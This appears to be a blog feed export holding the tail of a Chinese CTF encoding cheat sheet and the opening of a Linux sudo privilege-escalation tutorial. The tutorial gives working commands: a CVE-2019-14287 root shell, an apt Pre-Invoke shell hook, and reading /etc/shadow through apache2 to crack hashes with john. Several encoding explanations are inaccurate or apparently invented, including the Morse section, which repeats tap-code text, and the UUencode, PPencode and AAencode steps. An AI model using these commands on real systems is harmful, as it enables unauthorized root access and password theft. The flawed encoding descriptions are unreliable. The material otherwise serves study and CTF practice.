<td align="center">Base 58</td>
<td>Z8XgFYKj8dyvwswr4W1</td>
<td>3mJr7AoUCHxNqd</td>
</tr>
<tr>
<td align="center">Base 85</td>
<td>&#x3D;(Q2XDf’&amp;.FDi9h&lt;(6            S7mHtZ*65DbZ;O-R7L</td>
<td>0etOA2)[BQ3A:      F)}kWH8wXmIWP</td>
</tr>
<tr>
<td align="center">Base 91</td>
<td>CPE&#x3D;e&gt;we#F)&amp;Qj5d+A</td>
<td>QztEml0o[2;(A</td>
</tr>
<tr>
<td align="center">Base 92</td>
<td>@e_$Soc8&gt;otsiB+C:Z</td>
<td>3&#x3D;:glIXSJZJ6!</td>
</tr>
<tr>
<td align="center">Base 100</td>
<td>👎👜👣👚👦👤👜🐗👫👦🐗🐺👋🐽</td>
<td>🐨🐩🐪🐫🐬🐭🐮🐯🐰🐧</td>
</tr>
</tbody></table>
<h2 id="3-Rot编码"><a href="#3-Rot编码" class="headerlink" title="3.Rot编码"></a>3.Rot编码</h2><p>ROT编码是一种简单的字符替换技术，通过将字母按照一定规则移动一定数量的位置来进行编码。具体来说，ROT编码将字母表中的每个字母向前或向后移动一个固定的偏移量，以产生一个新的字母表。<br>ROT编码的主要特点包括：</p>
<ol>
<li>ROT编码是一种对称算法，可以使用相同的偏移量进行加密和解密。</li>
<li>ROT编码是一种很弱的加密算法，因为其加密过程非常简单，可以被轻易地破解。一般情况下，ROT编码只用于简单的信息隐藏，而不适合用于对机密信息进行保护。</li>
<li>ROT编码的加密效果受到偏移量的影响。如果偏移量太小，则加密后的信息容易被猜测；如果偏移量太大，则加密后的信息难以理解。</li>
<li>ROT编码只适用于字母表中的字符，不能用于数字和其他字符的编码。</li>
</ol>
<h3 id="Rot-5"><a href="#Rot-5" class="headerlink" title="Rot 5"></a>Rot 5</h3><p>只将字符串中的数字进行加密，步数为5，同时在0-9十个数字进行循环</p>
<h3 id="Rot-13"><a href="#Rot-13" class="headerlink" title="Rot 13"></a>Rot 13</h3><p>只将字符串中的字母进行加密，步数为13，分别在A-Z或a-z之间循环</p>
<h3 id="Rot-18"><a href="#Rot-18" class="headerlink" title="Rot 18"></a>Rot 18</h3><p>将上述两种加密方式结合，分别对数字和字母进行相应的操作</p>
<h3 id="Rot-47"><a href="#Rot-47" class="headerlink" title="Rot 47"></a>Rot 47</h3><p>对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符</p>
<h2 id="4-Hex编码"><a href="#4-Hex编码" class="headerlink" title="4.Hex编码"></a>4.Hex编码</h2><p>Hex编码（也称十六进制编码）是一种将数据转换为只由16个字符（0-9和A-F）组成的编码方式。它通常用于表示二进制数据，例如计算机文件中的数据、网络传输中的数据等。Hex编码的原理是将每个字节（8个二进制位）转换为两个十六进制数字（0-9和A-F），即每个十六进制数字表示4个二进制位。 总结说Hex编码后的二进制长度变为了原来的2倍，所以字节长度增加了一倍。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Hex编码</td>
<td>Welcome to CTF</td>
<td>57656c636f6d6520746f20435446</td>
</tr>
</tbody></table>
<h2 id="5-进制转换"><a href="#5-进制转换" class="headerlink" title="5.进制转换"></a>5.进制转换</h2><p>机制转换是指将数字在不同进位制之间进行转换的过程。通常我们使用的进位制是十进制，即每个数位可以表示0到9中的一位数。除此之外，还有二进制、八进制、十六进制等进位制。不同的进位制在表示相同的数字时，使用的数字字符和进位规则不同。<br>在进行机制转换时，需要将原数从一种进位制转换为另一种进位制。</p>
<table>
<thead>
<tr>
<th>明文</th>
<th align="left">Welcome to CTF</th>
</tr>
</thead>
<tbody><tr>
<td>二进制</td>
<td align="left">01010111 01100101 01101100 01100011 01101111 01101101 01100101 00100000 01110100 01101111 00100000 01000011 01010100 01000110</td>
</tr>
<tr>
<td>八进制</td>
<td align="left">0o127 0o145 0o154 0o143 0o157 0o155 0o145 0o40 0o164 0o157 0o40 0o103 0o124 0o106</td>
</tr>
<tr>
<td>十进制</td>
<td align="left">87 101 108 99 111 109 101 32 116 111 32 67 84 70</td>
</tr>
<tr>
<td>十六进制</td>
<td align="left">57 65 6c 63 6f 6d 65 20 74 6f 20 43 54 46</td>
</tr>
</tbody></table>
<h2 id="6-Unicode"><a href="#6-Unicode" class="headerlink" title="6.Unicode"></a>6.Unicode</h2><p>Unicode 是国际标准<strong>字符集</strong>，它将世界各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台的文本信息转换<br>Unicode 字符集的编码范围是 <strong>0x0000 - 0x10FFFF</strong> , 可以容纳一百多万个字符， 每个字符都有一个独一无二的编码，也即每个字符都有一个二进制数值和它对应，这里的二进制数值也叫 <strong>码点</strong> 。</p>
<h4 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h4><p>UTF-8: 是一种变长字符编码，被定义为将码点编码为 1 至 4 个字节，具体取决于码点数值中有效二进制位的数量<br>UTF-8 的编码规则:</p>
<ol>
<li>对于单字节的符号，字节的第一位设为 <strong>0</strong>，后面 7 位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的, 所以 UTF-8 能兼容 ASCII 编码，这也是互联网普遍采用 UTF-8 的原因之一</li>
<li>对于 <strong>n</strong> 字节的符号（ <strong>n &gt; 1</strong>），第一个字节的前 <strong>n</strong> 位都设为 <strong>1</strong>，第 <strong>n + 1</strong> 位设为 <strong>0</strong>，后面字节的前两位一律设为 <strong>10</strong> 。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码</li>
</ol>
<h4 id="UTF-16编码"><a href="#UTF-16编码" class="headerlink" title="UTF-16编码"></a>UTF-16编码</h4><p>UTF-16 也是一种变长字符编码, 这种编码方式比较特殊, 它将字符编码成 2 字节 或者 4 字节<br>具体的编码规则如下:</p>
<ol>
<li>对于 Unicode 码小于 <strong>0x10000</strong> 的字符， 使用 <strong>2</strong> 个字节存储，并且是直接存储 Unicode 码，不用进行编码转换</li>
<li>对于 Unicode 码在 <strong>0x10000</strong> 和 <strong>0x10FFFF</strong> 之间的字符，使用 <strong>4</strong> 个字节存储，这 <strong>4</strong> 个字节分成前后两部分，每个部分各两个字节，其中，前面两个字节的前 <strong>6</strong> 位二进制固定为 <strong>110110</strong>，后面两个字节的前 6 位二进制固定为 <strong>110111</strong>, 前后部分各剩余 10 位二进制表示符号的 Unicode 码 减去 <strong>0x10000</strong> 的结果</li>
<li>大于 <strong>0x10FFFF</strong> 的 Unicode 码无法用 UTF-16 编码</li>
</ol>
<h4 id="UTF-32编码"><a href="#UTF-32编码" class="headerlink" title="UTF-32编码"></a>UTF-32编码</h4><p>UTF-32 是固定长度的编码，始终占用 4 个字节，足以容纳所有的 Unicode 字符，所以直接存储 Unicode 码即可，不需要任何编码转换。</p>
<h2 id="7-HTML实体编码"><a href="#7-HTML实体编码" class="headerlink" title="7.HTML实体编码"></a>7.HTML实体编码</h2><p>HTML实体编码是一种将HTML中特殊字符表示为实体（entity）的方法，以避免这些字符被浏览器解释为HTML代码。HTML实体可以用实体名称或实体编号表示，实体名称以“&amp;”符号开始，以“;”符号结束；实体编号以“&amp;#”符号开始，以“;”符号结束。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文：Welcome to CTF</span><br><span class="line">十进制：&amp;#87;&amp;#101;&amp;#108;&amp;#99;&amp;#111;&amp;#109;&amp;#101;&amp;#32;&amp;#116;&amp;#111;&amp;#32;&amp;#67;&amp;#84;&amp;#70;</span><br><span class="line">十六进制：&amp;#x57;&amp;#x65;&amp;#x6C;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x65;&amp;#x20;&amp;#x74;&amp;#x6F;&amp;#x20;&amp;#x43;&amp;#x54;&amp;#x46;</span><br></pre></td></tr></table></figure>
<h2 id="8-URL编码"><a href="#8-URL编码" class="headerlink" title="8.URL编码"></a>8.URL编码</h2><p>URL编码是一种将URL中特殊字符表示为%xx（xx为字符对应的ASCII码值的十六进制表示）的方法，以便浏览器和服务器能够正确解释和传输URL。URL编码主要是用于将URL中的参数和数值进行编码，以便在浏览器和服务器之间进行传输。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文: Welcome to CTF</span><br><span class="line">密文: %57%65%6c%63%6f%6d%65%20%74%6f%20%43%54%46</span><br></pre></td></tr></table></figure>
<h2 id="9-Escape编码"><a href="#9-Escape编码" class="headerlink" title="9.Escape编码"></a>9.Escape编码</h2><p>Escape编码是一种将字符串中的特殊字符转换为%xx（xx为字符对应的ASCII码值的十六进制表示）的方法，以便浏览器和服务器能够正确解释和传输该字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文: Welcome to CTF</span><br><span class="line">密文: %u0057%u0065%u006c%u0063%u006f%u006d%u0065%u0020%u0074%u006f%u0020%u0043%u0054%u0046</span><br></pre></td></tr></table></figure>

<h2 id="10-Quoted-printable编码"><a href="#10-Quoted-printable编码" class="headerlink" title="10.Quoted-printable编码"></a>10.Quoted-printable编码</h2><p>Quoted-printable编码是一种将8位字节编码为ASCII字符的方法，主要用于将二进制数据转换为可显示的ASCII文本。Quoted-printable编码会将ASCII码值大于等于128的字节编码为“&#x3D;”加上其ASCII码值的十六进制表示。同时，Quoted-printable编码也会将某些特殊字符编码为其对应的可打印字符加上“&#x3D;”和其ASCII码值的十六进制表示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文: 欢迎来到CTF</span><br><span class="line"></span><br><span class="line">密文: =E6=AC=A2=E8=BF=8E=E6=9D=A5=E5=88=B0CTF</span><br></pre></td></tr></table></figure>



<h2 id="11-XXencode"><a href="#11-XXencode" class="headerlink" title="11.XXencode"></a>11.XXencode</h2><p>XXencode是一种二进制数据编码方法，用于将二进制数据转换成可打印字符.</p>
<p>XXencode的编码过程：</p>
<ol>
<li>将原始数据按每三个字节一组进行分割。</li>
<li>对每组字节进行转换，转换成四个字符，即将每组三个字节，分别占据4个6位字符的后6位，然后在每个字符前加上字节“0x20”。</li>
<li>对于不足三个字节的组，进行特殊处理。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文: Welcome to CTF</span><br><span class="line"></span><br><span class="line">密文: D0ZRZP4BjPKIUR4wUEpF4</span><br></pre></td></tr></table></figure>

<h2 id="12-UUencode"><a href="#12-UUencode" class="headerlink" title="12.UUencode"></a>12.UUencode</h2><p>UUencode是一种二进制数据编码方法，用于将二进制数据转换成可打印字符.</p>
<p>UUencode的编码过程：</p>
<ol>
<li>将原始数据按每三个字节一组进行分割。</li>
<li>对于每组字节，将每个字节的8位二进制转换为6位的字符表示，即将每个字节的8位二进制拆分为4位和4位，然后在每个4位二进制前面加一个0，得到三个字节对应的四个字符。</li>
<li>对于不足三个字节的组，进行特殊处理。</li>
<li>对于转换后的每个四个字符一组，加上一个字节的偏移量0x20（即加上32），得到一个五个字符的编码组。</li>
<li>将编码组的五个字符拼接起来，得到编码结果。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明文:  Welcome to CTF</span><br><span class="line"></span><br><span class="line">密文:  /&quot;E=E;&amp;-O;64@=&amp;\@0U1&amp;</span><br></pre></td></tr></table></figure>



<h2 id="13-PPencode（？）"><a href="#13-PPencode（？）" class="headerlink" title="13.PPencode（？）"></a>13.PPencode（？）</h2><p>PPencode是一种二进制数据编码方法，类似于Base64编码，可以将二进制数据转换成可打印字符。</p>
<p>PPencode的编码过程：</p>
<ol>
<li>将原始数据按每三个字节一组进行分割。</li>
<li>对于每组字节，将每个字节的8位二进制转换为5位的字符表示，即将每个字节的8位二进制拆分为3位和5位，然后在每个3位二进制前面加两个0，得到三个字节对应的五个字符。</li>
<li>对于不足三个字节的组，进行特殊处理。</li>
<li>对于转换后的每个五个字符一组，加上一个固定字符“P”，得到一个六个字符的编码组。</li>
<li>将编码组的六个字符拼接起来，得到编码结果。</li>
</ol>
<h2 id="14-AAencode（？）"><a href="#14-AAencode（？）" class="headerlink" title="14.AAencode（？）"></a>14.AAencode（？）</h2><p>AAencode是一种JavaScript代码混淆工具，可以将可读性强的JavaScript代码转换为一堆看起来毫无规律的字符。</p>
<p>AAencode的编码过程如下：</p>
<ol>
<li>将原始JavaScript代码转换为Unicode编码表示的字符串。</li>
<li>将Unicode编码字符串转换为二进制表示的字符串。</li>
<li>将二进制字符串按照固定长度进行分组，每组长度为6位。</li>
<li>对于每组二进制字符串，将其转换为10进制数值，并加上固定的一个整数常量。</li>
<li>将每个10进制数值转换为字符表示，得到一堆看起来毫无规律的字符。</li>
</ol>
<h2 id="15-JJencode（？）"><a href="#15-JJencode（？）" class="headerlink" title="15.JJencode（？）"></a>15.JJencode（？）</h2><p>JJencode是一种基于ASCII码值偏移的JavaScript代码混淆工具，可以将可读性强的JavaScript代码转换为一堆看起来毫无规律的字符。</p>
<p>JJencode的编码过程如下：</p>
<ol>
<li>将原始JavaScript代码转换为字符串形式。</li>
<li>将字符串形式的JavaScript代码转换为一系列ASCII码值的序列。</li>
<li>对于每个ASCII码值，将其加上一个固定的整数常量，例如10。</li>
<li>将每个ASCII码值转换为16进制表示，得到一堆看起来毫无规律的字符。</li>
</ol>
<h2 id="16-JSfuck"><a href="#16-JSfuck" class="headerlink" title="16.JSfuck"></a>16.JSfuck</h2><p>JSFuck是一种将JavaScript代码转换成只包含六个字符[ ]( ) ! +的编码方式，这六个字符是JavaScript中的基本运算符和括号。通过这种编码方式，可以绕过某些安全限制，使得JavaScript代码在某些受限制的环境下依然能够执行。<br>JSFuck编码的原理是利用JavaScript中的强制类型转换和运算符优先级来进行转换。例如，可以利用加号（+）将数字和字符串相互转换，利用逻辑非（!）将值转换成布尔类型，利用方括号（[]）表示数组，利用括号（()）来控制运算符的优先级等等。<br>虽然JSFuck代码难以阅读和理解，但是由于只使用了六个字符，所以可以轻松地通过复制和粘贴来传递代码。在实际应用中，JSFuck常常被用来绕过一些安全限制，例如防止恶意脚本攻击等。</p>
<h2 id="17-jother"><a href="#17-jother" class="headerlink" title="17.jother"></a>17.jother</h2><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： <code>! + ( ) [ ] &#123; &#125;</code> 。只用这些字符就能完成对任意字符串的编码。</p>
<h2 id="18-brainfuck"><a href="#18-brainfuck" class="headerlink" title="18.brainfuck"></a>18.brainfuck</h2><p>Brainfuck是一种极简主义的编程语言。Brainfuck 编程语言非常简单和直观，但由于其特殊的设计和限制，编写和理解 Brainfuck 程序可能需要一些时间和练习。这种语言的主要目的是为了演示计算机理论中的图灵完备性概念，即只要一种语言足够强大，就可以用它来模拟任何图灵机。</p>
<h2 id="19-敲击码-Tap-code"><a href="#19-敲击码-Tap-code" class="headerlink" title="19.敲击码(Tap code)"></a>19.敲击码(Tap code)</h2><p>敲击码（Tap Code）是一种类似于摩尔斯电码的编码方式，用于将文本信息转换为敲击信号进行传输。因该编码对信息通过使用一系列的点击声音来编 码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的， 不同点是是用 K 字母被整合到 C 中。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">敲击码</td>
<td>Welcome to CTF</td>
<td>52 15 31 13 34 32 15 44 34 13 44 21</td>
</tr>
</tbody></table>
<h2 id="20-摩尔斯电码-Morse-Code"><a href="#20-摩尔斯电码-Morse-Code" class="headerlink" title="20.摩尔斯电码(Morse Code)"></a>20.摩尔斯电码(Morse Code)</h2><p>敲击码（Tap Code）是一种类似于摩尔斯电码的编码方式，用于将文本信息转换为敲击信号进行传输。敲击码最初是由美国士兵在越南战争中发明的，用于在战场上进行秘密通信。敲击码中，通过敲击手指或敲击物体发出短促的敲击来代表不同的字母和数字。其中，一个敲击表示行数，另一个敲击表示列数。比如，一个敲击表示第一行，两个敲击表示第二行，依此类推。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">摩尔斯电码</td>
<td>Welcome to CTF</td>
<td>.– . .-.. -.-. — – . - — -.-. - ..-.</td>
</tr>
</tbody></table>
<h2 id="21-核心价值观编码"><a href="#21-核心价值观编码" class="headerlink" title="21.核心价值观编码"></a>21.核心价值观编码</h2><p>核心价值观编码是指将中华人民共和国的12个核心价值观用数字、符号等简化的方式进行编码和传递的一种方式。具体来说，可以用数字0-9和符号+、-、*、&#x2F;、&#x3D;、!、@等表示12个核心价值观中的每一个，从而使得传递和分享这些价值观变得更加简单和高效。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">核心价值观编码</td>
<td>Welcome to CTF</td>
<td>平等法治公正平等公正友善公正公正和谐公正诚信平等公正友善法治公正平等文明富强法治自由公正友善敬业文明富强自由和谐平等自由自由公正</td>
</tr>
</tbody></table>
<h2 id="22-与佛论禅"><a href="#22-与佛论禅" class="headerlink" title="22.与佛论禅"></a>22.与佛论禅</h2><p>与佛论禅是一套特殊的加密机制，标志特征开头是否有佛曰或者新佛曰就行，注意，相同的明文可能会得到不同的密文。在解密过程中，使用在线解密工具就行。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">与佛论禅（新）</td>
<td>Welcome to CTF</td>
<td>新佛曰：諸隸僧諳降諳吽諸陀摩隸僧諳缽諳薩願心亦諳囉諳修隸摩哆寂囉諳空尊修塞諳哆諳是宣蜜念寂如如諳囑囑</td>
</tr>
<tr>
<td align="center">与佛论禅</td>
<td>Welcome to CTF</td>
<td>佛曰：呐他奢滅呐菩娑梵沙俱般有究諳訶怛俱悉怯世呐波皤滅哆迦耶實諳地梵悉以侄悉梵特罰穆滅哆般沙諳佛冥寫梵耶多諳一想</td>
</tr>
</tbody></table>
<h2 id="23-与熊论道"><a href="#23-与熊论道" class="headerlink" title="23.与熊论道"></a>23.与熊论道</h2><p>与佛论禅相似，都是采用特殊的编码方式，关键在于辨认出来。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">与熊论道</td>
<td>Welcome to CTF</td>
<td>熊曰：呋食食捕註溫會雜麼家現山意寶象歡溫嗚噤吃哈</td>
</tr>
</tbody></table>
<h2 id="24-兽音译者"><a href="#24-兽音译者" class="headerlink" title="24.兽音译者"></a>24.兽音译者</h2><p>依据范例，辨认出关键特征。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">兽音译者</td>
<td>Welcome to CTF</td>
<td>~呜嗷嗷嗷嗷呜呜<del>啊啊呜嗷呜呜</del>嗷<del>嗷啊嗷啊呜嗷嗷呜~~嗷</del>呜呜嗷嗷啊嗷嗷嗷呜啊嗷嗷啊呜嗷呜呜<del>嗷呜嗷啊嗷啊呜嗷嗷嗷嗷</del>嗷<del>呜嗷嗷~~嗷嗷嗷呜啊呜呜</del>呜嗷呜呜<del>嗷呜啊啊嗷啊呜</del>嗷啊~~嗷<del>呜嗷啊嗷啊嗷嗷嗷呜呜</del>呜<del>呜嗷呜呜啊啊</del>呜啊</td>
</tr>
</tbody></table>
<h2 id="25-颜文"><a href="#25-颜文" class="headerlink" title="25.颜文"></a>25.颜文</h2><p>与上面三种相似。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th>明文</th>
<th>密文</th>
</tr>
</thead>
<tbody><tr>
<td align="center">颜文</td>
<td>Welcome to CTF</td>
<td>ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;<em>´∇｀</em>&#x2F; [‘<em>‘]; o&#x3D;(ﾟｰﾟ)  &#x3D;</em>&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^<em>^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;{ﾟΘﾟ: ‘</em>‘ ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +’<em>‘) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ ‘</em>‘)[o^<em>^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +’</em>‘)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +’<em>‘) [c^_^o];(ﾟДﾟ) [‘c’] &#x3D; ((ﾟДﾟ)+’</em>‘) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [‘o’] &#x3D; ((ﾟДﾟ)+’<em>‘) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [‘c’]+(ﾟДﾟ) [‘o’]+(ﾟωﾟﾉ +’</em>‘)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +’<em>‘) [ﾟｰﾟ] + ((ﾟДﾟ) +’</em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +’<em>‘) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +’</em>‘) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [‘c’]+((ﾟДﾟ)+’<em>‘) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [‘o’]+((ﾟｰﾟ&#x3D;&#x3D;3) +’</em>‘) [ﾟΘﾟ];(ﾟДﾟ) [‘<em>‘] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +’</em>‘) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+’<em>‘) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +’</em>‘) [o^<em>^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +’</em>‘) [ﾟΘﾟ]+ (ﾟωﾟﾉ +’<em>‘) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;’\‘; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +’</em>‘)[c^<em>^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;’&quot;‘;(ﾟДﾟ) [‘</em>‘] ( (ﾟДﾟ) [‘<em>‘] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (‘</em>‘);</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>linux提权</title>
    <url>/2023/09/29/linux%E6%8F%90%E6%9D%83%EF%BC%881%EF%BC%89sudo%E5%85%B6%E4%B8%80/</url>
    <content><![CDATA[<h1 id="Linux提权之sudo"><a href="#Linux提权之sudo" class="headerlink" title="Linux提权之sudo"></a>Linux提权之sudo</h1><p>近期开始学习一些linux提权相关的知识，本次是主要以sudo为主的提权学习，未完待续~~</p>
<p>Linux系统上对文件的权限有着严格的控制，如果想对某个文件执行某种操作，必须具有对应的权限方可执行成功。<br>Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x。<br>Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文件都可以针对三个粒度，设置不同的rwx(读写执行)权限。通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组。·	</p>
<p><a href="https://gtfobins.github.io/">GTFOBins</a></p>
<p>第一步，列出枚举项，查看可利用点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<h2 id="1-sudo-CVE-2019-14287"><a href="#1-sudo-CVE-2019-14287" class="headerlink" title="1.sudo (CVE-2019-14287)"></a>1.sudo (CVE-2019-14287)</h2><h3 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h3><p>用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令。</p>
<p><strong><u>Sudo 1.8.28版本以前可利用，版本号 &lt; 1.8.28的Sudo版本均将受到该漏洞的影响。</u></strong></p>
<p><img src="https://s2.loli.net/2023/09/29/rTuV5QcHeqEpaWJ.png"></p>
<h3 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h3><p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure>

<p>或  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u#4294967295 /bin/bash</span><br></pre></td></tr></table></figure>

<p>PS：看到网上有复现失败的案例，应该是sudoers文件问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id ALL=(ALL,!root) ALL</span><br></pre></td></tr></table></figure>

<h2 id="2-sudo-apt"><a href="#2-sudo-apt" class="headerlink" title="2.sudo apt"></a>2.sudo apt</h2><h3 id="使用前提-1"><a href="#使用前提-1" class="headerlink" title="使用前提"></a>使用前提</h3><p><img src="https://s2.loli.net/2023/09/29/P4TnO2L5StZWVpY.png"></p>
<h3 id="使用流程-1"><a href="#使用流程-1" class="headerlink" title="使用流程"></a>使用流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash</span><br></pre></td></tr></table></figure>

<p>同理还有apt -get</p>
<p>另外还找到另一种相关的提权手法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/bash;false&quot;&#125;&#x27; &gt; $TF</span><br><span class="line">sudo apt install -c $TF sl</span><br></pre></td></tr></table></figure>

<h2 id="3-sudo-apache2"><a href="#3-sudo-apache2" class="headerlink" title="3.sudo apache2"></a>3.sudo apache2</h2><h3 id="使用前提-2"><a href="#使用前提-2" class="headerlink" title="使用前提"></a>使用前提</h3><p><img src="https://s2.loli.net/2023/09/29/sID45TXb9rNjCeJ.png"></p>
<h3 id="使用流程-2"><a href="#使用流程-2" class="headerlink" title="使用流程"></a>使用流程</h3><p>通过指定的错误文件配置，使得apache2报错，得到相应的哈希值，通过john得到用户密码，实现提权。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim xxx[存放报错信息]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo john [上述存放报错信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]</span><br></pre></td></tr></table></figure>

